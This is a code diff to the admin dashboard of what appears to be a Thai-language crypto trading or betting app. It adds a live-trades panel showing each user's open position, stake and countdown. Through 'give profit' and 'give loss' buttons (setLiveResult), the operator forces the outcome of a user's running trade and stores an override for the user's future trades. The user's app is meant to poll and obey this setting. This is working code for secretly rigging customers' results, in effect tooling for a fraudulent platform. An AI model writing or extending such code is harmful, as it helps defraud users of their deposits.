@@ -135,6 +135,36 @@ tr:hover td{background:rgba(255,255,255,.02)}
 .toast{position:fixed;top:16px;right:16px;background:var(--card);border:1px solid var(--border);border-radius:10px;padding:.625rem 1.25rem;font-size:13px;opacity:0;transition:opacity .3s;pointer-events:none;z-index:9999;box-shadow:0 4px 20px rgba(0,0,0,.4);color:var(--text)}
 .toast.show{opacity:1}
 .unread-dot{width:8px;height:8px;border-radius:50%;background:var(--red);margin-left:auto}
+
+/* Live Trades */
+.live-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:1rem}
+.live-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:1.25rem;position:relative;overflow:hidden}
+.live-card.pulse{animation:livePulse 2s infinite}
+@keyframes livePulse{0%,100%{border-color:var(--border)}50%{border-color:rgba(16,185,129,.5)}}
+.live-badge-dot{position:absolute;top:1rem;right:1rem;display:flex;align-items:center;gap:6px;font-size:11px;color:var(--green);font-weight:700}
+.live-badge-dot::before{content:'';width:8px;height:8px;border-radius:50%;background:var(--green);animation:blink 1s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+.lc-user{font-size:16px;font-weight:800;margin-bottom:2px}
+.lc-uid{font-size:10px;color:var(--sub);margin-bottom:.875rem}
+.lc-detail{display:flex;justify-content:space-between;margin-bottom:.5rem;font-size:13px}
+.lc-detail-label{color:var(--sub)}
+.lc-detail-val{font-weight:600}
+.lc-dir-up{color:var(--green);font-weight:700}
+.lc-dir-down{color:var(--red);font-weight:700}
+.lc-timer-box{background:rgba(0,0,0,.2);border-radius:10px;padding:.75rem;text-align:center;margin:.875rem 0}
+.lc-timer-num{font-size:32px;font-weight:900;font-variant-numeric:tabular-nums}
+.lc-timer-lbl{font-size:10px;color:var(--sub)}
+.lc-controls{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:.875rem}
+.lc-btn-win{padding:12px;background:rgba(16,185,129,.15);color:#34d399;border:1px solid rgba(16,185,129,.4);border-radius:10px;font-size:13px;font-weight:700;cursor:pointer}
+.lc-btn-win.active{background:var(--green);color:#000}
+.lc-btn-lose{padding:12px;background:rgba(239,68,68,.15);color:#f87171;border:1px solid rgba(239,68,68,.4);border-radius:10px;font-size:13px;font-weight:700;cursor:pointer}
+.lc-btn-lose.active{background:var(--red);color:#fff}
+.lc-current{text-align:center;font-size:11px;margin-top:.5rem;padding:6px;border-radius:6px}
+.lc-current.win{background:rgba(16,185,129,.1);color:#34d399}
+.lc-current.lose{background:rgba(239,68,68,.1);color:#f87171}
+.lc-current.auto{background:rgba(59,130,246,.1);color:#60a5fa}
+.live-empty{text-align:center;padding:4rem 2rem;color:var(--sub)}
+.live-empty-icon{font-size:48px;margin-bottom:1rem;opacity:.5}
 </style>
 </head>
 <body>
@@ -165,6 +195,10 @@ tr:hover td{background:rgba(255,255,255,.02)}
     <div class="sidebar-menu">
       <div class="menu-item active" onclick="showSection('overview',this)">
         <span class="menu-icon">📊</span> ภาพรวม
+      </div>
+      <div class="menu-item" onclick="showSection('live',this)" id="menu-live">
+        <span class="menu-icon">🔴</span> เทรดสด
+        <span class="menu-badge" id="live-badge" style="display:none;background:#10b981">0</span>
       </div>
       <div class="menu-item" onclick="showSection('users',this)">
         <span class="menu-icon">👥</span> จัดการผู้เล่น
@@ -205,6 +239,17 @@ tr:hover td{background:rgba(255,255,255,.02)}
             <tbody id="users-tbody-ov"></tbody>
           </table>
         </div>
+      </div>
+    </div>
+
+    <!-- LIVE TRADES -->
+    <div class="content-section" id="section-live">
+      <div class="content-header">
+        <div class="content-title">🔴 เทรดสด <span>คนที่กำลังเทรดอยู่ตอนนี้</span></div>
+        <button class="btn-sm" onclick="loadLiveTrades()">🔄 รีเฟรช</button>
+      </div>
+      <div id="live-trades-list">
+        <div class="live-empty"><div class="live-empty-icon">💤</div><div>ยังไม่มีใครกำลังเทรดอยู่</div></div>
       </div>
     </div>
 
@@ -274,7 +319,7 @@ window.doAdminLogin=function(){
     isAdmin=true;sessionStorage.setItem('is_admin','1');
     document.getElementById('login-overlay').style.display='none';
     document.getElementById('admin-layout').style.display='flex';
-    refreshAll();subscribeRooms();
+    refreshAll();subscribeRooms();subscribeLiveTrades();updateLiveBadge();
   } else {
     document.getElementById('a-err').textContent='รหัสผ่านไม่ถูกต้อง';
   }
@@ -291,7 +336,7 @@ if(sessionStorage.getItem('is_admin')==='1'){
   isAdmin=true;
   document.getElementById('login-overlay').style.display='none';
   document.getElementById('admin-layout').style.display='flex';
-  setTimeout(()=>{refreshAll();subscribeRooms();},300);
+  setTimeout(()=>{refreshAll();subscribeRooms();subscribeLiveTrades();updateLiveBadge();},300);
 }
 
 function showSection(id,el){
@@ -302,11 +347,131 @@ function showSection(id,el){
   if(id==='chat') loadChatRooms();
   if(id==='withdrawals') loadWithdrawals();
   if(id==='users') loadUsers();
+  if(id==='live') loadLiveTrades();
 }
 
 function showToast(msg){
   const t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');
   setTimeout(()=>t.classList.remove('show'),2500);
+}
+
+// ─── LIVE TRADES ───
+let liveTradesChannel=null;
+let liveTimers={};
+
+async function loadLiveTrades(){
+  const {data}=await sb.from('active_trades').select('*').eq('status','active').order('created_at',{ascending:false});
+  const el=document.getElementById('live-trades-list');
+  // Update badge
+  const badge=document.getElementById('live-badge');
+  const count=(data||[]).length;
+  if(count>0){badge.style.display='inline';badge.textContent=count;}
+  else badge.style.display='none';
+  
+  if(!data||!data.length){
+    el.innerHTML='<div class="live-empty"><div class="live-empty-icon">💤</div><div>ยังไม่มีใครกำลังเทรดอยู่</div></div>';
+    return;
+  }
+  
+  el.innerHTML='<div class="live-grid">'+data.map(t=>{
+    const isBuy=t.direction==='buy';
+    const elapsed=Math.floor((Date.now()-new Date(t.created_at).getTime())/1000);
+    const remaining=Math.max(0,t.duration-elapsed);
+    const forced=t.forced_result||'auto';
+    const curLabel=forced==='win'?'✓ ให้กำไร':forced==='lose'?'✗ ให้ขาดทุน':!isNaN(parseFloat(forced))?(parseFloat(forced)>=0?'+':'')+forced+'%':'🎲 สุ่ม/อัตโนมัติ';
+    const curClass=forced==='win'||(!isNaN(parseFloat(forced))&&parseFloat(forced)>=0)?'win':forced==='lose'||(!isNaN(parseFloat(forced))&&parseFloat(forced)<0)?'lose':'auto';
+    return `<div class="live-card pulse" id="live-card-${t.id}">
+      <div class="live-badge-dot">LIVE</div>
+      <div class="lc-user">👤 ${t.username}</div>
+      <div class="lc-uid">ID: ${t.user_id.slice(0,8)}...</div>
+      <div class="lc-detail"><span class="lc-detail-label">เหรียญ</span><span class="lc-detail-val">${t.symbol}/THB</span></div>
+      <div class="lc-detail"><span class="lc-detail-label">ทิศทาง</span><span class="${isBuy?'lc-dir-up':'lc-dir-down'}">${isBuy?'▲ ซื้อ (ขึ้น)':'▼ ขาย (ลง)'}</span></div>
+      <div class="lc-detail"><span class="lc-detail-label">เงินลงทุน</span><span class="lc-detail-val">฿${Math.round(t.bet).toLocaleString()}</span></div>
+      <div class="lc-detail"><span class="lc-detail-label">ราคาเปิด</span><span class="lc-detail-val">฿${Math.round(t.open_price).toLocaleString()}</span></div>
+      <div class="lc-timer-box">
+        <div class="lc-timer-num" id="live-timer-${t.id}" data-remaining="${remaining}" data-total="${t.duration}">${remaining}</div>
+        <div class="lc-timer-lbl">วินาทีที่เหลือ</div>
+      </div>
+      <div class="lc-controls">
+        <button class="lc-btn-win ${forced==='win'?'active':''}" onclick="setLiveResult('${t.id}','win')">💰 ให้กำไร</button>
+        <button class="lc-btn-lose ${forced==='lose'?'active':''}" onclick="setLiveResult('${t.id}','lose')">📉 ให้ขาดทุน</button>
+      </div>
+      <div class="lc-current ${curClass}" id="live-current-${t.id}">ปัจจุบัน: ${curLabel}</div>
+    </div>`;
+  }).join('')+'</div>';
+  
+  // Start countdown timers for each card
+  startLiveTimers();
+}
+
+function startLiveTimers(){
+  // Clear old
+  Object.values(liveTimers).forEach(t=>clearInterval(t));
+  liveTimers={};
+  
+  document.querySelectorAll('[id^="live-timer-"]').forEach(el=>{
+    const id=el.id.replace('live-timer-','');
+    liveTimers[id]=setInterval(()=>{
+      let rem=parseInt(el.dataset.remaining)-1;
+      if(rem<=0){
+        clearInterval(liveTimers[id]);
+        el.textContent='0';
+        // Reload after trade completes
+        setTimeout(loadLiveTrades,2000);
+        return;
+      }
+      el.dataset.remaining=rem;
+      el.textContent=rem;
+      // Color based on time
+      const total=parseInt(el.dataset.total);
+      const pct=(rem/total)*100;
+      el.style.color=pct>50?'var(--text)':pct>20?'#f59e0b':'var(--red)';
+    },1000);
+  });
+}
+
+async function setLiveResult(tradeId, result){
+  // Update the active_trade forced_result - user's app will poll this
+  await sb.from('active_trades').update({forced_result:result}).eq('id',tradeId);
+  // Also update result_overrides for future trades
+  const {data:at}=await sb.from('active_trades').select('user_id').eq('id',tradeId).single();
+  if(at){
+    await sb.from('result_overrides').upsert({user_id:at.user_id,result,updated_at:new Date().toISOString()},{onConflict:'user_id'});
+  }
+  // Update UI
+  const card=document.getElementById('live-card-'+tradeId);
+  if(card){
+    card.querySelectorAll('.lc-btn-win,.lc-btn-lose').forEach(b=>b.classList.remove('active'));
+    card.querySelector(result==='win'?'.lc-btn-win':'.lc-btn-lose').classList.add('active');
+    const cur=document.getElementById('live-current-'+tradeId);
+    if(cur){
+      cur.className='lc-current '+(result==='win'?'win':'lose');
+      cur.textContent='ปัจจุบัน: '+(result==='win'?'✓ ให้กำไร':'✗ ให้ขาดทุน');
+    }
+  }
+  showToast(result==='win'?'✓ ตั้งให้กำไรแล้ว':'✗ ตั้งให้ขาดทุนแล้ว');
+}
+
+function subscribeLiveTrades(){
+  if(liveTradesChannel)sb.removeChannel(liveTradesChannel);
+  liveTradesChannel=sb.channel('admin_live_trades')
+    .on('postgres_changes',{event:'*',schema:'public',table:'active_trades'},()=>{
+      // Reload if on live section
+      if(document.getElementById('section-live').classList.contains('active')){
+        loadLiveTrades();
+      } else {
+        // Just update badge
+        updateLiveBadge();
+      }
+    }).subscribe();
+}
+
+async function updateLiveBadge(){
+  const {data}=await sb.from('active_trades').select('id').eq('status','active');
+  const badge=document.getElementById('live-badge');
+  const count=(data||[]).length;
+  if(count>0){badge.style.display='inline';badge.textContent=count;}
+  else badge.style.display='none';
 }
 
 function refreshAll(){loadUsers();loadChatRooms();loadWithdrawals();}
@@ -485,7 +650,7 @@ async function loadWithdrawals(){
 async function approveWd(id){await sb.from('withdrawals').update({status:'approved'}).eq('id',id);showToast('อนุมัติแล้ว ✓');loadWithdrawals();}
 async function rejectWd(id){await sb.from('withdrawals').update({status:'rejected'}).eq('id',id);showToast('ปฏิเสธแล้ว');loadWithdrawals();}
 
-setInterval(()=>{if(isAdmin){loadUsers();loadWithdrawals();loadChatRooms();}},15000);
+setInterval(()=>{if(isAdmin){loadUsers();loadWithdrawals();loadChatRooms();updateLiveBadge();if(document.getElementById('section-live').classList.contains('active'))loadLiveTrades();}},15000);
 </script>
 </body>
 </html>
